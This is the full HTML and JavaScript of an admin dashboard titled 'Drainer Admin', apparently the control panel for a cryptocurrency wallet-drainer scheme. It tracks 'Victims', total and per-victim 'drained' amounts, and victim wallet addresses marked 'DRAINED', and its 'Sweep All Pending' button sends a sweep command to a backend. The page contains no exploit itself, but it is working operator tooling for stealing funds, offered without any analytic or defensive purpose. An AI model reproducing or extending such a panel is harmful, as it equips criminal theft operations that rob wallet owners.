<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Drainer Admin • 2025</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <style>
    body { font-family: 'Inter', sans-serif; }
    .sidebar { background: linear-gradient(180deg, #0f0f0f 0%, #1a1a1a 100%); }
    .active-link { background: rgba(34, 197, 94, 0.15); border-left: 4px solid #22c55e; }
    .card { background: #111111; border: 1px solid #222222; }
  </style>
</head>
<body class="h-full bg-gray-900 text-gray-100">

<div class="flex h-screen">

  <!-- Sidebar -->
  <div class="w-64 sidebar text-white flex flex-col">
    <div class="p-6 border-b border-gray-800">
      <h1 class="text-2xl font-bold text-green-500">DRAINER</h1>
      <p class="text-xs text-gray-400 mt-1">Control Panel v5</p>
    </div>
    <nav class="flex-1 p-4">
      <a href="#" class="flex items-center space-x-3 p-4 rounded-lg active-link mb-2">
        <i class="fas fa-tachometer-alt"></i>
        <span class="font-medium">Dashboard</span>
      </a>
      <a href="#" class="flex items-center space-x-3 p-4 rounded-lg hover:bg-gray-800 mb-2">
        <i class="fas fa-users"></i>
        <span>Victims</span>
      </a>
      <a href="#" class="flex items-center space-x-3 p-4 rounded-lg hover:bg-gray-800 mb-2">
        <i class="fas fa-wallet"></i>
        <span>Sweeper</span>
      </a>
      <a href="#" class="flex items-center space-x-3 p-4 rounded-lg hover:bg-gray-800">
        <i class="fas fa-cog"></i>
        <span>Settings</span>
      </a>
    </nav>
    <div class="p-4 border-t border-gray-800">
      <div class="text-xs text-gray-400">Status: <span class="text-green-500 font-bold">ONLINE</span></div>
    </div>
  </div>

  <!-- Main Content -->
  <div class="flex-1 overflow-y-auto">
    <div class="p-8">

      <!-- Top Stats -->
      <div class="grid grid-cols-4 gap-6 mb-8">
        <div class="card rounded-xl p-6">
          <div class="flex items-center justify-between">
            <div>
              <p class="text-gray-400 text-sm">Total Drained</p>
              <p class="text-3xl font-bold text-green-500" id="total">$0</p>
            </div>
            <i class="fas fa-dollar-sign text-4xl text-green-500 opacity-20"></i>
          </div>
        </div>
        <div class="card rounded-xl p-6">
          <div class="flex items-center justify-between">
            <div>
              <p class="text-gray-400 text-sm">Victims Today</p>
              <p class="text-3xl font-bold text-blue-400" id="count">0</p>
            </div>
            <i class="fas fa-skull-crossbones text-4xl text-blue-400 opacity-20"></i>
          </div>
        </div>
        <div class="card rounded-xl p-6">
          <div>
            <p class="text-gray-400 text-sm">Avg per Victim</p>
            <p class="text-2xl font-bold text-yellow-400" id="avg">$0</p>
          </div>
        </div>
        <div class="card rounded-xl p-6">
          <div>
            <p class="text-gray-400 text-sm">Sweeper Wallet</p>
            <p class="text-xs font-mono break-all text-gray-300" id="wallet">loading...</p>
          </div>
        </div>
      </div>

      <!-- Live Table -->
      <div class="card rounded-xl p-6">
        <div class="flex justify-between items-center mb-6">
          <h2 class="text-2xl font-bold">Live Drains</h2>
          <button onclick="sweepAll()" class="bg-green-600 hover:bg-green-700 px-6 py-3 rounded-lg font-medium flex items-center gap-2">
            <i class="fas fa-bolt"></i> Sweep All Pending
          </button>
        </div>
        <div class="overflow-x-auto">
          <table class="w-full text-sm">
            <thead class="border-b border-gray-700">
              <tr>
                <th class="text-left py-3">Time</th>
                <th class="text-left py-3">Wallet</th>
                <th class="text-left py-3">Chain</th>
                <th class="text-left py-3">Amount</th>
                <th class="text-left py-3">Status</th>
              </tr>
            </thead>
            <tbody id="victims" class="divide-y divide-gray-800"></tbody>
          </table>
        </div>
      </div>

    </div>
  </div>
</div>

<script>
  function update() {
    fetch('/data')
      .then(r => r.json())
      .then(d => {
        document.getElementById('total').textContent = '$' + Number(d.total).toLocaleString()
        document.getElementById('count').textContent = d.victims.length
        document.getElementById('avg').textContent = d.victims.length ? '$' + Math.round(d.total / d.victims.length).toLocaleString() : '$0'
        document.getElementById('wallet').textContent = d.wallet

        const tbody = document.getElementById('victims')
        tbody.innerHTML = d.victims.slice().reverse().map(v => `
          <tr class="hover:bg-gray-800 transition">
            <td class="py-4 text-gray-400">${v.time}</td>
            <td class="py-4 font-mono text-cyan-400">${v.wallet}</td>
            <td class="py-4"><span class="px-3 py-1 bg-gray-800 rounded-full text-xs">${v.chain}</span></td>
            <td class="py-4 text-green-400 font-bold">${v.drained}</td>
            <td class="py-4"><span class="text-green-500 text-xs">✓ DRAINED</span></td>
          </tr>
        `).join('')
      })
  }

  function sweepAll() {
    fetch('/sweep', {method: 'POST'}).then(() => {
      alert('Sweep command sent to all chains.')
    })
  }

  setInterval(update, 3000)
  update()
</script>
</body>
</html>
